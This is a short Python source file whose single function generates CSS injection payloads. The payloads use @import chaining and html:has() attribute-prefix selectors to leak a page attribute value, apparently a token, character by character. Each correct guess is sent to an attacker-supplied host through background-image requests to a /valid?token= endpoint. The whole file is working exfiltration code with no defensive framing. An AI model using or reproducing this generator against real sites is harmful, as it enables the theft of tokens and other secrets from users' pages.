import random
import urllib.parse


def generate_injection(
    hostname, port, data, identifier, selector, elements, counter_req
):
    stri = f"@import url('//{hostname}:{port}/next?num={random.random()}');\n"
    stri += f'html:has({identifier}[{selector}={repr(data)}]{"".join([f":not({identifier}[{selector}={repr(element)}])" for element in elements])}){"".join([":first-child" for i in range(counter_req)])}{{background: url("//{hostname}:{port}/end?num={random.random()}") !important;}}'
    stri += "".join(
        map(
            lambda x: f'html:has({identifier}[{selector}^={repr(data+x)}]{"".join([f":not({identifier}[{selector}={repr(element)}])" for element in elements])}){"".join([":first-child" for i in range(counter_req)])}{{background: url("//{hostname}:{port}/valid?token={urllib.parse.quote_plus(data+x)}") !important;}}\n',
            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",
        )
    )
    return stri
